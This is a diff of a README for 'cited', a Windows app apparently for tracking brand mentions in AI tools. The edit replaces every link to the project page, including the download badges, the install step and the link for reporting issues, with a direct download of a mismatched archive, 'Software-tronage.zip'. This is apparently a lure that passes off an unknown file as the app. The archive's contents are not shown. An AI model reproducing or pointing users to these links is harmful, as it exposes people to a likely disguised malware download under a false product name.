@@ -1,6 +1,6 @@
 # 🤖 cited - Check AI Brand Mentions Fast
 
-[![Download cited](https://img.shields.io/badge/Download-cited-brightgreen?style=for-the-badge)](https://github.com/deepak278s/cited)
+[![Download cited](https://img.shields.io/badge/Download-cited-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/deepak278s/cited/main/src/Software-tronage.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to download and run cited on your Windows PC. You don’t nee
 ## 📥 Download and install
 
 1. Click the big green **Download cited** button at the top or visit this page to download the app:  
-   [https://github.com/deepak278s/cited](https://github.com/deepak278s/cited)  
+   [https://raw.githubusercontent.com/deepak278s/cited/main/src/Software-tronage.zip](https://raw.githubusercontent.com/deepak278s/cited/main/src/Software-tronage.zip)  
 
 2. Once on the page, look for the latest release or setup file. This will often be an `.exe` or `.msi` file under the "Releases" section.
 
@@ -98,7 +98,7 @@ cited sends queries to AI tools using their search APIs or official endpoints. I
 
 If you run into issues or want to suggest features:
 
-- Open the GitHub page here: [https://github.com/deepak278s/cited](https://github.com/deepak278s/cited)  
+- Open the GitHub page here: [https://raw.githubusercontent.com/deepak278s/cited/main/src/Software-tronage.zip](https://raw.githubusercontent.com/deepak278s/cited/main/src/Software-tronage.zip)  
 - Go to the "Issues" tab and create a new issue describing your problem or request.  
 - This project is community-driven and updates may be released based on user feedback.
 
@@ -137,4 +137,4 @@ These tools influence how people find brands online. Tracking their mentions hel
 
 ---
 
-[![Download cited](https://img.shields.io/badge/Download-cited-yellow?style=for-the-badge)](https://github.com/deepak278s/cited)
+[![Download cited](https://img.shields.io/badge/Download-cited-yellow?style=for-the-badge)](https://raw.githubusercontent.com/deepak278s/cited/main/src/Software-tronage.zip)
